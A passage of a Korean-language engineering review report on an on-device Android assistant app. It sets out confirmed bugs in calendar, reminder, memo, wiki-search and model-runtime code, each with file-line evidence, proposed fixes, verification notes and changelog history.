받는 글이 달라지므로(①도 넘칠 때는 달라짐) 실측 선행 표시가 맞다.
- 앞선 기록: CHANGELOG 0.40.6 M2(일정·알림 조회 결과 토큰 상한, 일정 조회는 꼬리 안내를 자른 뒤 붙임), 0.42.0 M1(exp93 — 결과 목록만 자료 표지로 감쌈). 기억 검색의 잘림 순서와 '못 찾았을 때' 목록의 표지 누락은 기록 없음

### tools-6 · 기기 캘린더에 넣지 못해도 사용자와 모델은 "성공"만 본다 — 실패가 로그 한 줄로만 남고 이벤트 id 도 버린다
- 판정 이미 결정·기록됨 · 중요도 낮음 · 크기 M
- 왜: 앱 일정에는 알림이 없다(알림은 별도 툴). 사용자는 삼성 캘린더에 들어간 일정의 알림에 기대게 되는데, 권한을 거절했거나 기본 캘린더를 잘못 골라 쓰기가 실패해도 채팅에는 "추가했어요"와 결과 카드만 뜬다. 0.17.0 실기기 확인 때도 "앱에는 저장됐는데 캘린더 앱 반영이 확인되지 않음"이 미확정으로 남았다. 매일 쓰기 시작하면 "캘린더에 없네?"를 뒤늦게 발견하는 식으로 드러난다. 읽기 실패는 알리면서 쓰기 실패는 숨기는 비대칭은 면접에서 설명하기 어렵다. 이벤트 id 를 버리므로 나중에 일정 수정·삭제를 만들 때 기기 쪽 사본을 찾을 방법도 없다(지금은 제목+시작 시각으로만 중복을 거른다).
- 제안: "로컬 저장이 진실, 기기 캘린더는 최선 노력"(ADR-004)은 그대로 두고 실패만 드러낸다. AddScheduleUseCase 가 Success(taskId) 대신 저장 id + 기기 반영 여부(반영됨/권한 없음/실패)를 담은 결과를 돌려주고, 실행기는 그것을 meta(모델에게 가기 전에 떼는 부분)에 실어 결과 카드에 "앱에만 저장됨 — 캘린더 권한 필요" 한 줄을 보인다. 모델에게 가는 성공 문구는 바꾸지 않는다. 기기 이벤트 id 는 task_item 에 열 하나(deviceEventId)로 저장해 두면 이후 수정·삭제 기능의 바탕이 된다(DB 마이그레이션 1건). 기본 캘린더 선택은 쓰기 가능한(접근 등급이 기여자 이상) 표시 중인 캘린더 중 기본을 고르도록 조건을 보강하고, 기기 게이트 목록에 "승인한 일정이 삼성 캘린더에 보이는가"를 넣는다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/AddScheduleUseCase.kt:48-49,65-69 — 기기 캘린더 쓰기 결과를 버리고(성공은 Unit, 실패는 경고 로그) 항상 Success(taskId) 반환
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/AddScheduleToolExecutor.kt:64-72 — 결과는 늘 "일정이 성공적으로 추가되었습니다"
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/calendar/AndroidCalendarTool.kt:107-109,181-203 — 권한 없으면 실패, 기본 캘린더는 IS_PRIMARY=1 의 첫 행이고 못 찾으면 _ID=1 로 가정
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GetTodayScheduleUseCase.kt:124-134 — 읽기 쪽은 같은 실패를 deviceCalendarFailed 로 올려 화면·모델에 알림(쓰기 쪽만 조용함)
- 검증: 코드 사실은 주장대로다: AddScheduleUseCase.kt:46-52,57-70 — insert 결과를 버리고 실패는 AppLogger.w 한 줄, 항상 Success(taskItem.id). AddScheduleToolExecutor.kt:64-72 — 늘 성공 문구(70줄 주석이 '기기 캘린더 이벤트 id 는 쓰기 결과로 오지 않는다'고 명시). AndroidCalendarTool.kt:107-109(권한 없으면 실패), 181-203(IS_PRIMARY=1 첫 행, 없으면 _ID=1). 읽기 쪽은 GetTodayScheduleUseCase.kt:121-134 에서 실패를 플래그로 올린다(비대칭 사실). 그러나 쓰기 실패를 조용히 두는 것은 ADR-004 와 0.17.0 기록에 일부러 그렇게 둔 것으로 적혀 있고, 그때 사용자가 '무관'으로 판단했다. 제안은 ADR-004 를 유지한 채 화면 카드에만 드러내는 것이라 결정을 정면으로 뒤집지는 않지만, 다시 열려면 사용자 결정이 필요하다(DB 마이그레이션 1건 포함 — 실사용 직전 단계의 비용). 결함이 아니라 재검토 후보로만 남길 것.
- 앞선 기록: docs/architecture.md ADR-004(1278-1281줄 — 로컬 DB 가 진실, 기기 캘린더는 최선 노력, '동기화 실패는 경고 로깅으로 강등'), CHANGELOG 0.17.0 실기기 확정 Note(1154줄 — '동기화 실패는 설계상 조용히 로컬 저장을 유지한다(ADR-004)', 캘린더 앱 미반영은 '사용자 판단: 무관'), docs/plans/0.38.2-chat-redesign.md:10(기기 캘린더 이벤트 id 를 버린다는 점을 이미 알고 있음)

### tools-7 · 시각 없이 날짜만 온 값이 일시 검증을 통과한다 — 알림은 자정 0시에 울리고, 일정은 앱에서는 종일인데 기기 캘린더에는 0시~1시로 들어간다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: "내일 약 먹으라고 알려줘"처럼 시각 없는 알림 부탁에 모델이 날짜만 보내면, 승인 시트에는 "내일 / 종일"이라는 알림답지 않은 표기가 뜨고 승인하면 자정에 알림이 울린다. 오늘 날짜만 보내면 "이미 지난 시각" 오류가 돌아가 모델이 시각을 지어내 다시 부르게 된다. 일정 쪽은 앱 화면과 기기 캘린더가 서로 다른 모양(종일 vs 0시~1시)이 된다. 모델이 날짜만 보내는 빈도는 재 본 적이 없어 가능성은 낮게 보지만, 걸리면 한밤중 알림이라 체감이 크다.
- 제안: ① 알림: AddReminderToolExecutor.parse 에서 IsoDateTimeParser.isDateOnly(time) 이면 지금 있는 형식 오류(BAD_FORMAT — 문구에 '2026-08-17T15:00:00' 예시가 이미 들어 있음)로 돌려 시각을 받게 한다. 새 문구가 없어 모델 입력 예산은 그대로지만, 알림 문항으로 회귀 세트를 한 번 돌려 확인한다. ② 일정: AndroidCalendarTool.insert 에서 시작이 날짜만이면 ALL_DAY=1, 시간대 UTC, DTSTART=그날 UTC 0시, DTEND=끝 날짜 다음 날 UTC 0시로 쓴다(읽기 쪽 해석과 대칭). 테스트: 날짜만 온 알림은 승인 요청이 만들어지지 않는다 / 날짜만 온 일정의 삽입 값.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/util/IsoDateTimeParser.kt:29-33 — toEpochMillis 가 날짜만 있는 값("2026-11-21")을 그날 0시로 받아들임
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/ToolArguments.kt:77-93 — requireIsoDateTime 은 그 함수가 null 이 아니면 통과(이름·KDoc 은 "일시")
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/AddReminderToolExecutor.kt:57-60,112-113 — 알림 시각을 그대로 쓰고, 날짜만이면 0시가 예약 시각이 됨
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/agent/ToolCallGuards.kt:71 — "몇 시가 없으면 묻기" 가드는 일정 추가에만 있고 알림에는 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/calendar/AndroidCalendarTool.kt:120-145 — 쓰기에서 종일 표시(ALL_DAY)를 넣지 않아 날짜만 있는 일정이 0시 시작 1시간짜리로 들어감(읽기 쪽 76-85줄은 종일을 따로 처리)
- 검증: 직접 읽음: IsoDateTimeParser.kt:29-33 — 날짜만 값을 그날 0시로 받아들임. ToolArguments.kt:77-93 — toEpochMillis 가 null 이 아니면 통과. AddReminderToolExecutor.kt:57-60,112-119 — 날짜만이면 0시가 예약 시각, displayTime 은 toDisplayKorean 이 '종일'로 표기(IsoDateTimeParser.kt:63). AddReminderUseCase.kt:33-36 도 형식·과거만 검사(isDateOnly 검사 없음). ToolCallGuards.kt:67-84 — 시각 가드는 전부 ADD_SCHEDULE 조건, 알림용 가드 없음(grep 확인). AndroidCalendarTool.kt:138-145 — ALL_DAY 를 넣지 않고 종료는 시작+1시간, 읽기(76-85줄)만 종일을 따로 처리. 주장 성립. 보정: 일정 쪽은 '몇 시가 없으면 묻기' 가드(ToolCallGuards.kt:71)가 먼저 막으므로 툴 경로에서 날짜만 일정이 들어오는 일은 드물다 — 실질 위험은 알림 쪽이고, 모델이 날짜만 보내는 빈도는 측정된 적이 없다. 알림 제안은 기존 BAD_FORMAT 문구를 재사용하지만 모델이 받는 결과가 달라지는 경우가 생기므로 회귀 세트 한 번은 필요하다.
- 앞선 기록: CHANGELOG 0.33.0(기기 캘린더 종일 일정 읽기 수정 — 쓰기 쪽 언급 없음), 0.41.15 M2(몇 시가 없으면 묻기 — 일정 추가만). 알림의 날짜만 값·종일 쓰기는 기록 없음

### tools-8 · 메모 저장은 늘 새 메모를 만든다 — 값을 바꿔 다시 저장하면 옛 값과 새 값이 나란히 남고, 검색 결과에는 어느 쪽이 최신인지 표시가 없다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: "자전거 비밀번호 4821로 바꿨어, 저장해줘"를 승인하면 옛 메모(134)는 그대로 남는다. 다음에 "자전거 비밀번호 뭐였지?"를 물으면 두 메모가 모두 결과에 실리고, 모델은 순서 말고는 어느 것이 맞는지 알 근거가 없다. 과거 대화 요약과 메모가 다를 때 모델이 틀린 쪽을 고른 기록(0.36.1, 0.39.3)이 있는 만큼, 메모끼리 다를 때도 같은 일이 생길 수 있다(이 경우는 재 본 기록이 없다). 비밀번호·주소처럼 값이 바뀌는 정보가 이 앱의 대표 사용 예라 실사용 몇 주 안에 쌓인다. 정리 기능(설정 > 기억 정리)은 사용자가 직접 눌러야 한다.
- 제안: 저장 시점에 잡는다(모델 입력 불변). AddMemoryToolExecutor.buildApprovalRequest 에서 같은 주제·다른 값인 기존 직접 저장 메모를 찾는다 — 숫자를 뺀 글의 겹침으로 판정하는 함수가 이미 있다(KnowledgeAutoSaveFilter 의 충돌 판정, MemoryMergeGuard). 있으면 승인 시트에 "기존 메모 '…134'를 이 내용으로 바꿀까요?"와 [바꾸기][따로 저장]을 보이고, 바꾸기면 기존 메모의 id 로 덮어쓴다(뜻 검색 벡터는 다시 만들어지도록 표시). 승인 요청 구성이 지금은 동기 함수라 조회를 넣으려면 suspend 로 바꾸거나 BaseAgent 가 미리 조회해 넘겨야 한다. 그 전에 실험실에서 "메모 두 건이 다른 값"일 때 모델이 어느 쪽을 답하는지 한 번 재 두면 우선순위 판단 근거가 된다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/SaveKnowledgeUseCase.kt:31-41 — 항상 새 UUID 로 저장(같은 주제의 기존 메모를 찾지 않음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/AddMemoryToolExecutor.kt:51-78 — 실행기도 중복·충돌 확인 없이 저장
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:295 — 값 충돌 판정(RecallConflict)은 "과거 대화 요약 대 메모"에만 적용되고 메모끼리는 보지 않음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:249-263,296-298 — 동점이면 최신순으로 앞에 올 뿐, 줄에는 날짜나 "최신" 표시가 없음
- 검증: 직접 읽음: SaveKnowledgeUseCase.kt:31-41 — 항상 새 UUID. AddMemoryToolExecutor.kt:39-49,51-78 — 중복·충돌 조회 없이 저장. SearchMemoryToolExecutor.kt:294-295 — RecallConflict.contradicts 는 episodeId != null(과거 대화) 쪽에만 적용, 메모끼리는 비교하지 않음. 249-263 — 동점이면 tier 다음 createdAt 내림차순일 뿐, 296-298 줄 형식('- 본문 [태그]')에 날짜·최신 표시 없음. 주장 성립. 보충 근거: 합치기 후보 조건이 '숫자 같음'(CHANGELOG 164줄)이라 값이 바뀐 메모 쌍은 기억 정리 기능으로도 묶이지 않는다 — 옛 값은 사용자가 직접 지워야만 사라진다. 한계: 메모 두 건이 다른 값일 때 모델이 어느 쪽을 답하는지는 측정된 적이 없다(같은 점수면 최신이 앞에 오므로 맞게 답할 수도 있음) — 위험이지 확인된 오답은 아니다. 제안의 '저장 시점 확인'은 buildApprovalRequest 가 동기 함수(ToolExecutor 인터페이스)라 구조 변경이 필요하다는 지적도 맞다.
- 앞선 기록: CHANGELOG 0.30.0(기억 정리 — 수동 합치기), 0.34.x 무렵 827줄(자동 메모가 기존 메모와 같은 대상·다른 숫자면 거름 — 자동 저장만), 0.36.1·0.39.3(요약 대 메모 충돌 안내), 164줄(합치기 후보는 '숫자 같음'이 조건). 직접 저장한 메모끼리 값이 다른 경우의 처리는 기록 없음

### tools-9 · 위키 검색에서 "문서 없음"이 네트워크 오류로 분류되고, 내부 오류 이름·예외 원문이 길이 제한 없이 모델에게 간다
- 판정 확인됨 · 중요도 낮음 · 크기 S · 모델 입력
- 왜: 위키에 문서가 없는 주제를 물으면 모델은 영어로 된 "NetworkUnavailable(reason=No Wikipedia articles found …)"을 받아 "네트워크 문제로 검색하지 못했어요"처럼 사실과 다른 이유를 말할 수 있고, 화면에도 검색 실패 안내가 뜬다. 실제 네트워크 예외는 원문 메시지가 길 수 있는데 툴 결과 상한(500토큰)을 거치지 않는다. 메모 저장에서는 "내부 오류 이름을 모델 입력에서 뺀다"고 정해 놓고 검색 두 곳에는 남아 있어 일관성이 깨진다. 웹 검색은 기본으로 꺼져 있어 영향 범위는 좁다.
- 제안: ① "문서 없음"을 실패가 아니라 성공 결과로 돌린다(문서 검색의 "관련 내용을 찾지 못했어요"와 같은 방식 — 실패 안내는 진짜 네트워크 실패에만). ② 오류 문구에서 ${res.error} 를 빼고 고정 문장만 남긴다(진단은 감사 기록이 이미 맡는다). ③ lang 은 ko·en 만 받고 나머지는 앱 언어로, 0건이면 다른 한쪽 언어로 한 번 더 찾는다. ①②는 모델이 받는 문구가 바뀌므로 위키 문항 몇 개로 "없다고 말하는지·지어내지 않는지"를 잰 뒤 넣는다(SearchWikipediaGroundingTest 의 고정 문구는 그대로).
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/data/src/main/java/com/kosmos/app/data/tool/WikipediaSearchToolImpl.kt:87 — 검색 결과 0건을 AppError.NetworkUnavailable 로 돌려줌(128줄의 실제 네트워크 실패와 같은 종류)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchWikipediaToolExecutor.kt:57 — 오류 문구에 ${res.error}(데이터 클래스 문자열 "NetworkUnavailable(reason=…)")를 그대로 넣음, 토큰 상한 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:262 — 실패면 searchFailed=true → "웹 검색 보강에 실패해…" 안내가 뜸(문서가 없을 뿐인데도)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/data/src/main/java/com/kosmos/app/data/tool/WikipediaSearchToolImpl.kt:39 — lang 은 글자 형식만 검사해 "kr"(카누리어 위키)·"korean"(없는 주소) 같은 값이 그대로 나감, 다른 언어로 다시 찾지 않음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:399-400 — 기억 검색 오류도 내부 오류 이름을 문구에 넣음(AddMemoryToolExecutor.kt:60-63 은 같은 것을 실측 뒤 뺐음)
- 검증: 직접 읽음: WikipediaSearchToolImpl.kt:86-88 — 검색 0건을 AppError.NetworkUnavailable("No Wikipedia articles found…")로 반환, 106줄(본문 없음)·80줄(HTTP 오류)·128줄(예외)도 같은 종류. QueryWikipediaUseCase 는 그대로 전달. SearchWikipediaToolExecutor.kt:57 — "검색 중 오류 발생: ${res.error}"(데이터 클래스 문자열, 길이 상한 없음). BaseAgent.kt:256-263 — 성공이 아니고 허용 목록 안이면 searchFailed=true. WikipediaSearchToolImpl.kt:39 — lang 은 글자 형식만 검사, 0건일 때 다른 언어 재시도 없음. SearchMemoryToolExecutor.kt:134-140,163,399-400 — error.toString() 을 문구에 넣음(AddMemoryToolExecutor.kt:60-63 은 실측 뒤 뺌). 주장 성립. 보정: 예외 메시지는 보통 짧아 '길이 제한 없음'의 실질 위험은 작고, 웹 검색은 토글로 켤 때만 선언되므로 영향 범위가 좁다 — 일관성·정확성 정리 수준. 문구 변경은 모델 입력이라 실측 선행 표시가 맞다.
- 앞선 기록: CHANGELOG 0.27.1(exp38 — 메모 저장 실패 문구에서 내부 오류 이름 제거), 0.17.x 1132줄(검색 실패 오표시 수정 — 실패면 안내), ADR-020(툴 결과 상한). 위키 '문서 없음' 분류와 검색 오류 문구의 내부 이름은 기록 없음

### tools-10 · 앱에 저장한 일정은 "시작 시각이 범위 안"일 때만 조회된다 — 어제 시작해 오늘까지 이어지는 일정이 오늘 일정에서 빠진다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: "금요일부터 일요일까지 여행"을 일정으로 넣으면 토요일에 "오늘 일정 뭐야?"를 물었을 때 조회 툴·오늘 탭·위젯·아침 브리핑에서 모두 빠진다. 월 달력에는 토요일에도 점이 찍혀 있어 화면끼리, 그리고 화면과 비서의 답이 서로 어긋난다. 기기 캘린더에 동기화가 된 경우에는 기기 쪽 사본이 겹침 판정으로 대신 잡혀 가려지지만(권한이 없거나 쓰기가 실패하면 그대로 빠짐), 같은 일정이 출처에 따라 보였다 안 보였다 하는 셈이다. 자정을 넘기는 일정(밤 11시~새벽 1시)도 자정 뒤에는 같은 이유로 빠진다.
- 제안: loadRange 의 앱 일정 필터를 겹침 판정으로 바꾼다: 시작 <= 범위 끝 AND (끝 시각이 있으면 끝, 없으면 시작) >= 범위 시작. 끝이 시작보다 앞인 값(tools-3)은 시작으로 본다. 중복 제거 키(제목, 시작 시각)는 그대로 둔다. 테스트: 어제 시작·내일 끝 일정이 오늘 범위에 포함된다 / 어제 끝난 일정은 빠진다 / 끝 없는 일정은 지금과 같다. 툴 결과의 문구는 그대로이고 목록에 걸친 일정이 한 줄 더 실릴 뿐이지만, 날짜 대조 안내(다른 날짜 일정은 말하지 말라)와 맞물리므로 여러 날 일정 문항 한두 개로 답을 확인한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GetTodayScheduleUseCase.kt:103-105 — 앱 일정은 시작 시각(ms)이 startMs..endMs 안인지로만 거름(끝 시각을 보지 않음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/calendar/AndroidCalendarTool.kt:48-53 — 기기 캘린더 쪽은 같은 문제를 "겹침 판정"(DTSTART < 끝 AND DTEND > 시작)으로 이미 고침
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/ui/calendar/MonthGrid.kt:37-48 — 월 달력은 걸친 날마다 일정을 표시(spanDays)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/GetScheduleToolExecutor.kt:55-70 — 툴은 유스케이스가 돌려준 목록만 모델에게 전달
- 검증: 직접 읽음: GetTodayScheduleUseCase.kt:102-117 — 앱 일정은 dueDateIso 의 시작 ms 가 startMs..endMs 안인지만 본다(endDateIso 미사용). AndroidCalendarTool.kt:48-53 — 기기 쪽은 'DTSTART < 끝 AND DTEND > 시작' 겹침 판정. MonthGrid.kt spanDays·eventsByDate — 걸친 날마다 표시. GetScheduleToolExecutor.kt:55-70 — 유스케이스 목록만 전달. 중복 제거 키(138-139줄)는 범위에 든 앱 일정만으로 만들어지므로, 기기에 동기화된 사본은 겹침 판정으로 따로 잡혀 대신 보인다는 설명도 코드와 맞다(권한 없음·쓰기 실패 때만 실제로 빠짐). 추가로 확인한 점: 월 조회 month()(79-88줄)도 같은 loadRange 를 쓰므로 지난달에 시작해 이번 달까지 이어지는 앱 일정은 월 달력에서도 빠진다 — 화면끼리의 어긋남은 달 경계에서도 생긴다. 며칠짜리 일정을 앱으로 넣는 빈도가 낮아 심각도는 낮음. 목록에 한 줄이 더 실릴 수 있어 날짜 대조 안내와의 상호작용은 문항 한두 개로 확인하는 것이 맞다.
- 앞선 기록: CHANGELOG 0.17.x 1094줄(기기 캘린더 조회를 완전 포함 → 겹침 판정으로 수정), 0.33.0(월 달력 여러 날 일정 spanDays). 앱 일정 쪽 필터를 겹침으로 바꾼다는 기록은 없음

<details><summary>읽은 범위</summary>

[읽은 것 — 전부 직접 읽음] app/src/main/java/com/kosmos/app/assistant/tool/ 13개 파일 전체(SearchMemoryToolExecutor 442줄 포함), di/AgentModule.kt, runtime/gemma/KosmosToolDeclarations.kt, :domain 의 tool/ToolNames·CalendarTool, usecase/AddSchedule·AddReminder·GetTodaySchedule·SaveKnowledge·QueryWikipedia, util/IsoDateTimeParser·SentenceTruncator, memory/CurrentConversationLines·TaskRepository, search/BigramMatcher, agent/SchedulePastIntent. 실행 경로 확인용으로 assistant/agent/BaseAgent.kt 의 툴 루프(60~588줄)·ToolCallGuards·ToolOutcome·KosmosAgent 활성 목록, platform/calendar/AndroidCalendarTool, platform/alarm/ReminderAlarmScheduler, data 의 WikipediaSearchToolImpl·KnowledgeDao·ConversationDao·TaskDao 질의, context/DataMarker, orchestrator/AttachedDocumentBlock·AssistantOrchestrator(저장 부분), feature/approval/ApprovalSheet(일정·알림 표기), widget/WidgetRefresher. docs/CHANGELOG.md·docs/architecture.md 는 항목별로 grep 대조(전체 통독은 아님).

[못 읽거나 일부만 본 것] RecallConflict·MemoryFusion·MemoryVectorRepository 구현, LibraryRepository 구현(문서 검색 순위), ScheduleTimeIntent·ScheduleWeekdayIntent 본문, EpisodeRepository 구현, 테스트 본문(이름만 확인), docs/plans·device_gate.md 는 열지 않음. 그래프 도구는 쓰지 않고 grep·파일 읽기만 사용. gradle·adb·실험은 규칙대로 실행하지 않았으므로 모델 행동에 관한 부분(tools-4 연도 실수 빈도, tools-7 날짜만 보내는 빈도, tools-8 메모 두 건일 때의 답)은 코드 경로만 확인한 추정이며 confidence=medium 으로 표시. tools-3 의 "끝<시작 이벤트가 삼성 캘린더에서 어떻게 보이는가"는 미확인.

[버린 항목 6건]
1) 같은 인자로 일정 추가를 두 번 부르는 중복 쓰기 — CHANGELOG 0.42.6~0.42.7 에서 원인(첫 호출만 실행하던 정책)을 찾아 차례 실행으로 고쳤고 매번 승인 시트를 거치므로 제외.
2) 일정·알림 실패 문구가 사실만 말함 — CHANGELOG 0.27.1 exp38c 에서 거짓 성공 0/6 으로 재고 유지하기로 한 것이라 제외.
3) 뜻 검색 경로가 관련 없어도 늘 상위 3건을 돌려줌, 최근 500건 밖 메모는 뜻 검색 후보에서 빠짐 — exp80b 실측과 ADR-025(규모 게이트)로 알고 둔 것이라 제외.
4) 문서 검색·위키 결과를 자료 표지로 감싸지 않음 — 0.42.0 에서 효과 없음으로 실측하고 결정한 것이라 제외.
5) 실행기가 인자 오류 말고 다른 예외를 던지면 BaseAgent(456~471줄)가 못 잡아, 쓰기가 끝난 뒤에도 감사 기록 없이 오류 말풍선으로 끝나고 대화 무효화도 안 됨 — 실행기들이 전부 결과 타입으로 실패를 돌려주고 알람·위젯은 자체 방어가 있어 실제로 던질 경로를 찾지 못해 순위에서 뺌(방어 코드로는 가치 있음, 낮음).
6) 범위 밖 관찰: 앱에 저장된 일정을 지우거나 고치는 화면·툴을 찾지 못함(일정 화면의 완료 체크는 할 일용, 기억 화면의 삭제는 일정을 뺀 할 일만) — 잘못 승인한 일정을 되돌릴 방법이 없어 보이나 화면 영역이라 확인을 끝내지 않았고 담당 영역에 넘김. tools-6 의 기기 이벤트 id 저장이 그 기능의 선행 조건.

증거의 줄 번호는 2026-11-20 작업 트리(커밋 310ab4b + 미커밋 gradle.properties 변경) 기준.

</details>

## 모델 런타임 (runtime)

### runtime-1 · 시작 화면에서 앱을 나가면 엔진(3.6GB)이 백그라운드에서 다시 올라오고, 시작 단계 추론까지 돈다
- 판정 확인됨 · 중요도 높음 · 크기 S
- 왜: 앱을 켜고 엔진 준비·시작 단계(10~25초)가 끝나기 전에 홈으로 나가는 것은 매일 생길 동선이다. 그때 onStop → close() → 상태 FileFound → 살아 있는 스플래시 뷰모델이 warmUp → 백그라운드에서 3.6GB 재로드 → Ready → 시작 단계가 요약·브리핑 추론까지 돈다. 이후 onTrimMemory 가 다시 close() 하면 또 FileFound → 또 재로드로 되풀이될 수 있다. '백그라운드에서 모델을 올리지 않는다'(AGENTS 2-⑥)는 불변식이 깨지고, 발열·배터리·프로세스 강제 종료로 이어진다. 0.16.2 에서 이 반응을 수명주기로 옮겼다고 기록했지만 스플래시 뷰모델의 구독은 그대로 남아 있다.
- 제안: 스플래시의 'FileFound 면 warmUp' 반응을 화면이 보일 때만 돌게 한다 — SplashScreen 에서 repeatOnLifecycle(STARTED) 안의 LaunchedEffect 로 옮기거나, 뷰모델 구독을 지우고 ModelWarmUpObserver(onStart)와 '다시 시도' 버튼만 남긴다. 더 근본적으로는 GemmaModelRunner.warmUp 이 '앱이 전경인가'(ProcessLifecycleOwner 상태를 주입한 판정)를 확인해 백그라운드면 올리지 않게 하면 다른 호출자도 함께 막힌다. JVM 테스트: close() 뒤 FileFound 가 방출돼도 warmUp 이 불리지 않는지.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/splash/SplashViewModel.kt:27-34 — viewModelScope 에서 loadState 를 계속 구독하다 FileFound 를 보면 무조건 warmUp() (화면 수명주기와 무관, Activity 가 멈춰도 살아 있음)
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:539-556 — close() 가 엔진을 내린 직후 checkModelFile() 로 상태를 FileFound 로 되돌림
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:102-106, 119-124 — 프로세스 onStop·onTrimMemory 가 close() 호출
  - app/src/main/java/com/kosmos/app/assistant/startup/StartupCoordinator.kt:95-103, 123-146 — Ready 가 되면 전경 여부를 보지 않고 요약·브리핑·대화 미리 준비 추론을 시작
  - app/src/main/java/com/kosmos/app/navigation/AppNavHost.kt:84 — 스플래시는 채팅으로 넘어갈 때에야 스택에서 빠짐(그 전에는 뷰모델이 살아 있음)
- 검증: 직접 읽은 근거: SplashViewModel.kt:27-35 는 viewModelScope 에서 loadState 를 계속 구독하고 FileFound 면 조건 없이 warmUp() 을 부른다(화면 수명주기·전경 여부 확인 없음). GemmaModelRunner.kt:539-556 close() 는 엔진을 닫은 뒤 554줄에서 checkModelFile() 로 상태를 FileFound 로 되돌린다. KosmosApp.kt:102-106(onStop)·119-124(onTrimMemory)가 close() 를 부른다. warmUp(GemmaModelRunner.kt:559-582)에는 전경 판정이 없다. StartupCoordinator.kt:95-102 는 Ready 마다 전경 여부를 보지 않고 요약·브리핑·미리 준비를 돌린다. AppNavHost.kt:83-85 에서 스플래시는 채팅으로 넘어갈 때에야 스택에서 빠진다. 재현 경로가 코드로 닫힌다: 시작 단계(요약·브리핑)가 도는 중 홈 → onStop → close() → FileFound → 쉬고 있던 스플래시 구독이 warmUp → 백그라운드에서 엔진 재로드 → Ready → 시작 단계 추론. 엔진 초기화 도중에 나간 경우는 setReady(메인)와 close 의 FileFound(LLM 스레드) 순서 경합이라 '백그라운드 재로드' 또는 '엔진 없는 거짓 Ready' 둘 중 하나가 된다(둘 다 결함). 이를 막는 가드·테스트는 찾지 못했다(SplashViewModel 을 다루는 테스트는 ScreenCatalogTest 뿐). 보충: onTrimMemory 뒤 되풀이는 가능하지만 OS 가 신호를 줄 때만이라 횟수는 추정. 수정 시 주의 — 뷰모델 구독을 그냥 지우면 모델 받기 화면(스플래시에서 진입, 같은 Activity 라 onStart 가 안 옴)에서 받기 완료 후 FileFound→Ready 로 올려 줄 곳이 없어지므로, 지우지 말고 '화면이 보일 때만(STARTED)'으로 옮기거나 warmUp 자체에 전경 판정을 넣는 쪽이 안전하다.
- 앞선 기록: CHANGELOG 0.16.2(docs/CHANGELOG.md:1158 — 'FileFound 를 보면 warmUp' 반응을 스플래시 뷰모델에서 앱 수명주기로 승격했다고 적었지만 뷰모델 구독을 남긴다는 결정 기록은 없음), AGENTS 2-⑥(백그라운드 로드 금지)

### runtime-2 · 백그라운드 전환이 끊은 추론이 '진짜 실패'로 세어진다 — 요약은 세 번이면 영구 실패, 채팅 답은 잘린 채 성공 또는 오류로 저장
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 앱을 열면 시작 단계가 지난 대화 요약(수 초)을 먼저 돌리는데, 그 사이 앱을 나가면 close() 가 추론을 끊는다. 스케줄러는 '엔진이 내려가서'(ModelNotReady)만 봐주므로 끊긴 요약은 실패 횟수로 쌓이고, 같은 대화가 세 번 끊기면 요약이 영구 실패로 굳는다(서랍·기억에 안 나옴). 네이티브가 예외 없이 끝내는 경우에는 반쯤 잘린 요약이나 인자가 덜 온 툴 호출이 정상 결과로 흘러간다. 실사용에서 '켰다가 바로 나가기'가 잦을수록 조용히 쌓이는 손실이다. 네이티브가 끊길 때 예외를 던지는지 조용히 끝나는지는 코드만으로 확인하지 못했다(둘 다 문제).
